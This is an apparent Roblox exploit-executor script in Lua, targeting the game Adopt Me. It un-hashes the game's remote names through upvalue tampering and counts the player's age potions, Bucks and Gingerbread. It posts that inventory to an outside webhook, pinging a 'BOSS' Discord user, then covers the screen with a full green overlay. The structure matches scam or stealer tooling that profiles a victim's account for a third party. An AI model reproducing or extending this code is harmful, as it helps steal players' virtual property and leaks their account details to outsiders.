-- Import dependencies
local Data = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local localPlayer = game.Players.LocalPlayer
local FsysModule = game.ReplicatedStorage:WaitForChild("Fsys")

if not FsysModule then
    error("Fsys module not found in ReplicatedStorage")
end

local Fsys = require(FsysModule).load

-- Function to format numbers as K/M/B
local function formatNumber(number)
    local num = tonumber(number)
    if num >= 1000000 then
        return string.format("%.2fM", num / 1000000)
    elseif num >= 1000 then
        return string.format("%dK", math.floor(num / 1000))
    else
        return tostring(num)
    end
end

-- Get and process currency amounts
local rawBucksAmount = game:GetService("Players").LocalPlayer.PlayerGui.BucksIndicatorApp.CurrencyIndicator.Container.Amount.Text
local bucksAmount = rawBucksAmount:gsub(",", "") -- Remove commas from the raw bucks amount

local rawGingerAmount = game:GetService("Players").LocalPlayer.PlayerGui.AltCurrencyIndicatorApp.CurrencyIndicator.Container.Amount.Text
local gingerAmount = rawGingerAmount:gsub(",", "") -- Remove commas from the raw ginger amount
local formattedGingerAmount = formatNumber(gingerAmount)

-- Initialize variables
local Counter = 0
local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer.PlayerGui

-- Create GUI
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.new(1, 1, 1)
frame.Parent = gui

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.Text = "Starting"
textLabel.TextSize = 20
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.Parent = frame

-- Rename function
local function rename(remotename, hashedremote)
    hashedremote.Name = remotename
end

-- Access RouterClient and rename items in its upvalues
local routerClient = Fsys("RouterClient")
if type(routerClient.init) == "function" then
    local success, upvalue = pcall(function()
        return getupvalue(routerClient.init, 4)
    end)
    if success and type(upvalue) == "table" then
        for key, value in pairs(upvalue) do
            rename(key, value)
        end
    else
        warn("Failed to get upvalue at index 4")
    end
else
    error("RouterClient init is not a function")
end

-- Count age potions in inventory
for i, v in pairs(Data.get_data()[tostring(game.Players.LocalPlayer)].inventory.food) do
    if v.kind == "pet_age_potion" then
        Counter = Counter + 1
        task.wait(0.1)
    end
end

-- Wait before sending data
wait(1)

-- Prepare data for the webhook
local data = {
    ["content"] = ("BOSS <@" .. discordid .. "> 🤖 " .. localPlayer.Name .. " has 🎅 [ADOPT ME] 🎅 " .. Counter .. " Age Potion + " .. bucksAmount .. " Bucks + " .. formattedGingerAmount .. " Gingerbread"),
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}
local request = http_request or request or HttpPost or syn.request

local payload = {
    Url = url,
    Body = newdata,
    Method = "POST",
    Headers = headers
}

-- Send the request
request(payload)

-- Final action: Update GUI
textLabel.Text = "Done"
frame.BackgroundColor3 = Color3.new(0, 1, 0)

-- Create a fullscreen green effect
local fullscreenFrame = Instance.new("ScreenGui")
fullscreenFrame.Parent = game.CoreGui
fullscreenFrame.Name = "Virtual"
fullscreenFrame.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
fullscreenFrame.Enabled = true

local overlayFrame = Instance.new("Frame")
overlayFrame.Parent = fullscreenFrame
overlayFrame.BackgroundColor3 = Color3.new(0, 1, 0)
overlayFrame.BorderSizePixel = 0
overlayFrame.Size = UDim2.new(1, 0, 1, 0)
overlayFrame.Position = UDim2.new(0, 0, 0, 0)
